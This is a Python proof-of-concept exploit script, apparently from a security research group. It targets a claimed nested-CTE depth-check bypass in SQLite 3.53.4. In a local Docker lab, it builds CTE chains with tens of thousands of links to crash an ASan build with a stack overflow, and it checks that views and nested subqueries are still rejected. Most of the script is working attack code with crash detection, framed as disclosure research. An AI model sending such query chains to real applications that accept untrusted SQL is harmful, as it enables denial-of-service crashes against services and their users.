#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: sqlite-cte-nest (High: 7.5)
#  Vendor: SQLite (Hwaci)
#  Versions: SQLite 3.53.4 (leftover of later trunk CTE nNestSel)
#  Impact: Nested CTEs crash the host; view-depth cap does not apply
#  Requires: untrusted SQL or nested CTE schema; ASan amalgamation; loopback 127.0.0.1:18810
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "sqlite-cte-nest"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove SQLite 3.53.4 CTE attach skips nNestSel and stack-crashes."""


import os
import subprocess
from dataclasses import dataclass
from pathlib import Path
from urllib.error import URLError
from urllib.request import urlopen

LABEL = "sqlite-cte-nest"
WITNESS = "SQLITE-CTE-NEST-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"

READY_URL = "http://127.0.0.1:18810/"
PIN_VERSION = "3.53.4"
PIN_SOURCE_ID = (
    "2026-07-24 19:02:57 "
    "bf7c7f30031888f4e796e429ab3978879485813aaca6f641c7b33e4e09459bcc"
)
SMALL_CTE_N = 5
VIEW_LIMIT = 20
VIEW_DEPTH = 25
NESTED_FROM_N = 25000
CRASH_NS = (25000, 40000, 50000)
VIEW_TOO_DEEP = "VIEWs and/or subqueries nested too deep"
PARSER_RECURSION = "Recursion limit"
ASAN_ENV = "detect_leaks=0:abort_on_error=1:halt_on_error=1:print_stacktrace=1"


@dataclass(frozen=True)
class SqliteRun:
    returncode: int
    stdout: str
    stderr: str
    timeout: bool

    @property
    def blob(self) -> str:
        return f"{self.stdout}\n{self.stderr}"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def write_sql(name: str, text: str) -> Path:
    WORK.mkdir(parents=True, exist_ok=True)
    path = WORK / name
    path.write_text(text, encoding="utf-8")
    return path


def cte_chain_sql(last_index: int) -> str:
    parts = ["c0 AS (SELECT 1)"]
    for i in range(1, last_index + 1):
        parts.append(f"c{i} AS (SELECT * FROM c{i - 1})")
    return "WITH " + ", ".join(parts) + f" SELECT * FROM c{last_index};\n"


def nested_from_sql(depth: int) -> str:
    return "SELECT * FROM (" * depth + "SELECT 1" + ")" * depth + ";\n"


def nested_view_sql(depth: int, expr_depth: int) -> str:
    lines = ["CREATE VIEW v0 AS SELECT 1 AS x;"]
    for i in range(1, depth + 1):
        lines.append(f"CREATE VIEW v{i} AS SELECT x FROM v{i - 1};")
    lines.append(f".limit expr_depth {expr_depth}")
    lines.append(f"SELECT * FROM v{depth};")
    return "\n".join(lines) + "\n"


def run_sqlite(sql_name: str, timeout: int = 90) -> SqliteRun:
    try:
        proc = compose(
            "exec",
            "-T",
            "-e",
            f"ASAN_OPTIONS={ASAN_ENV}",
            "sqlite",
            "bash",
            "-lc",
            f"sqlite3 :memory: < /work/{sql_name}",
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout if isinstance(exc.stdout, str) else ""
        stderr = exc.stderr if isinstance(exc.stderr, str) else ""
        return SqliteRun(returncode=-1, stdout=stdout, stderr=stderr, timeout=True)
    return SqliteRun(
        returncode=proc.returncode,
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        timeout=False,
    )


def one_line(text: str, limit: int = 240) -> str:
    compact = " ".join(text.split())
    if len(compact) > limit:
        return compact[: limit - 3] + "..."
    return compact


def crash_how(run: SqliteRun) -> str | None:
    blob = run.blob.lower()
    if "stack-overflow" in blob or "stack overflow" in blob:
        return "asan-stack-overflow"
    if "addresssanitizer" in blob or "deadlysignal" in blob:
        return "asan"
    if run.returncode in (139, 11, 139 - 128):
        return "sigsegv"
    if run.returncode in (134, 6, 134 - 128):
        return "sigabrt"
    if run.returncode in (132, 4, 132 - 128):
        return "sigill"
    if "segmentation fault" in blob:
        return "sigsegv"
    return None


def nested_from_rejected(run: SqliteRun) -> bool:
    blob = run.blob
    if VIEW_TOO_DEEP in blob or PARSER_RECURSION in blob:
        return True
    if run.returncode == 0 and crash_how(run) is None:
        return False
    low = blob.lower()
    return "recursion" in low or "nested too deep" in low or "parser" in low


def main() -> int:
    log(f"label={LABEL} ready={READY_URL}")
    try:
        with urlopen(READY_URL, timeout=5) as resp:
            ready_body = resp.read().decode("utf-8", errors="replace")
    except (URLError, TimeoutError, OSError) as exc:
        return fail(f"ready-unreachable err={exc}")
    log(f"ioc ready={one_line(ready_body)}")
    if WITNESS not in ready_body:
        return fail("ready-missing-witness")

    write_sql("pin.sql", "SELECT sqlite_version();\nSELECT sqlite_source_id();\n")
    pin = run_sqlite("pin.sql", timeout=30)
    log(f"ioc pin-rc={pin.returncode} out={one_line(pin.blob)}")
    if pin.timeout or pin.returncode != 0:
        return fail("pin-query-failed")
    if PIN_VERSION not in pin.blob:
        return fail("pin-version-mismatch")
    if PIN_SOURCE_ID not in pin.blob:
        return fail("pin-source-id-mismatch")

    write_sql("small-cte.sql", cte_chain_sql(SMALL_CTE_N))
    small = run_sqlite("small-cte.sql", timeout=30)
    log(
        f"ioc small-cte n={SMALL_CTE_N} rc={small.returncode} "
        f"out={one_line(small.blob)}"
    )
    if small.timeout or small.returncode != 0:
        return fail("small-cte-failed")
    if "1" not in small.stdout.split():
        return fail("small-cte-no-row")

    write_sql("nested-views.sql", nested_view_sql(VIEW_DEPTH, VIEW_LIMIT))
    views = run_sqlite("nested-views.sql", timeout=60)
    log(
        f"ioc nested-views depth={VIEW_DEPTH} limit={VIEW_LIMIT} "
        f"rc={views.returncode} out={one_line(views.blob)}"
    )
    if views.timeout:
        return fail("nested-views-timeout")
    if crash_how(views) is not None:
        return fail("nested-views-crashed")
    if VIEW_TOO_DEEP not in views.blob:
        return fail("nested-views-no-depth-error")

    write_sql("nested-from.sql", nested_from_sql(NESTED_FROM_N))
    nested = run_sqlite("nested-from.sql", timeout=60)
    log(
        f"ioc nested-from n={NESTED_FROM_N} rc={nested.returncode} "
        f"out={one_line(nested.blob)}"
    )
    if nested.timeout:
        return fail("nested-from-timeout")
    if crash_how(nested) is not None:
        return fail("nested-from-crashed")
    if not nested_from_rejected(nested):
        return fail("nested-from-not-rejected")

    crash_n = 0
    how = ""
    crash: SqliteRun | None = None
    for n in CRASH_NS:
        write_sql("crash.sql", cte_chain_sql(n))
        log(f"ioc crash-try n={n}")
        crash = run_sqlite("crash.sql", timeout=90)
        how_try = crash_how(crash)
        log(
            f"ioc crash-n={n} rc={crash.returncode} timeout={int(crash.timeout)} "
            f"how={how_try or 'none'} out={one_line(crash.blob)}"
        )
        if how_try:
            crash_n = n
            how = how_try
            break
        if crash.timeout:
            return fail(f"cte-crash-timeout n={n}")
        if crash.returncode == 0:
            log(f"ioc cte-survived n={n}")
            continue
        return fail(f"cte-unexpected-error n={n} rc={crash.returncode}")

    if crash is None or not how:
        return fail("cte-chain-did-not-crash")

    logged = 0
    for line in crash.blob.splitlines():
        low = line.lower()
        if "summary:" in low or logged < 8:
            if any(
                tok in low
                for tok in (
                    "addresssanitizer",
                    "stack-overflow",
                    "deadlysignal",
                    "selectexpander",
                    "sqlite3walkselect",
                    "segv",
                    "signal",
                    "summary:",
                )
            ):
                log(f"ioc crash-log {one_line(line, 300)}")
                logged += 1

    log(
        f"SUCCESS {LABEL} how={how} crash-n={crash_n} "
        f"small-cte=ok nested-views=too-deep nested-from=rejected {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

